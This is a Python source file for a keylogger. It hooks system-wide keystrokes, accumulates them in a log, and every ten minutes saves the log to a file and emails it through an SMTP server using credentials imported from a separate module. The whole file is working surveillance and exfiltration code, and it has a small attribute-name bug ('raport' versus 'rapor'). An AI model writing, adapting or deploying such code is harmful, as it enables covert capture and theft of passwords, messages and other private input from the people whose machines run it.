import keyboard #pynput can be used but mostly it gives "Remote Keyboard" information!
import smtplib
from threading import Timer
from datetime import datetime, time
import mail_information # imports mail information!

MAIL_USER = mail_information.USER 
MAIL_PASSWORD = mail_information.PASSWORD
MAIL_SMTP = mail_information.ETHEREAL #"smtp.ethereal.email" Ethereal Example
SMTP_PORT =  mail_information.PORT #587  Ethereal Port
RAPORT_TIME = 600 # 10 Minutes
RAPORT_TYPE = "mail" # "mail" or "file" can be used! 

class Keylogger:
    def __init__(self, time, raport):
        self.time = time
        self.raport = raport
        self.log = ""
        self.start_time = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
        self.end_time = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')


    def key_logging(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "ctrl":
                name = "[CTRL]"
            elif name == "alt":
                name = "[ALT]"
            elif name == "backspace":
                name = "[DLT]"
            elif name == "shift":
                name = "[^]"
            elif name == "!":
                name = "[!]"
            elif name == "down":
                name = "[DOWN]"
            elif name == "right":
                name = "[RIGHT]"
            elif name == "left":
                name = "[LEFT]"
            elif name == "up":
                name = "[UP]"
            #elif name == " ":
                #name = "[SPACE]" 
        self.log += name


    def name_file(self):
        start_time = str(self.start_time)
        end_time = str(self.end_time)
        self.file_name = f"log{start_time}_{end_time}"

    def make_file(self):
        with open(f"{self.file_name}.txt", "w+") as d:
            print(self.log, file=d)
        print(f"[+] New input: {self.file_name}.txt") # Output for terminal

    def mail_send(self, entry, mail=MAIL_USER, sifre=MAIL_PASSWORD):
        server = smtplib.SMTP(host=MAIL_SMTP, port=SMTP_PORT)
        #TLS type crypting
        server.starttls()
        server.login(mail, sifre)
        server.sendmail(mail,mail,entry.encode('utf-8'))
        server.quit()

    def entry(self):
        if self.log:
            self.name_file()
            self.make_file()
            if self.rapor == "mail":
                self.mail_send(self.log, MAIL_USER,MAIL_PASSWORD)
            elif self.rapor == "file":
                self.make_file() 
            print(f"[{self.file_name} is written to: {self.log}") 
            self.start_time = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')

        timer = Timer(interval=RAPORT_TIME, function=self.entry) # Multithread
        timer.daemon = True
        timer.start()
        self.log = ""

    def starter(self):
        self.start_time = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
        keyboard.on_release(callback=self.key_logging)
        self.entry()
        keyboard.wait()

if __name__ == "__main__":
    logger = Keylogger(time=RAPORT_TIME, raport=RAPORT_TYPE)
    logger.starter()